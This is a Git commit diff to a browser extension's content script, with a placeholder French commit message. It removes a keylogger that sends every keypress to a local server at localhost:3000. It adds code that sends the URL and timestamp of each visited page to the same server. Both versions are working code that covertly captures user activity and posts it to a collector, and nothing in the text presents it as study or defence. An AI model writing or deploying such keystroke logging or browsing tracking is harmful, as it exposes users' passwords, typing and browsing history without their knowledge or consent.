81b119dbc90c554c0886ba39f842c88a37793305
melvinRenversez <163991271+louanMel@users.noreply.github.com>
2024-06-19 20:38:49 +0200

    Message de votre commit

--- extention/content.js
+++ extention/content.js
@@ -1,24 +1,21 @@
-document.addEventListener('keydown', (e) => {
-    console.log(e.key);
+// Capturer l'URL et la date de connexion
+const data = {
+    url: window.location.href,
+    timestamp: new Date().toISOString()
+};
 
-    const data = {
-        key: e.key,
-        time: new Date().getTime()
-    };
-
-    fetch('http://localhost:3000/data', {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json'
-        },
-        body: JSON.stringify(data)
-    })
-    .then(response => response.text())
-    .then(responseText => {
-        console.log('Réponse du serveur :', responseText);
-    })
-    .catch(error => {
-        console.error('Erreur lors de l\'envoi des données :', error);
-    });
-    
+// Envoyer les données au serveur web
+fetch('http://localhost:3000/data', {
+    method: 'POST',
+    headers: {
+        'Content-Type': 'application/json'
+    },
+    body: JSON.stringify(data)
+})
+.then(response => response.text())
+.then(responseText => {
+    console.log('Réponse du serveur :', responseText);
+})
+.catch(error => {
+    console.error('Erreur lors de l\'envoi des données :', error);
 });
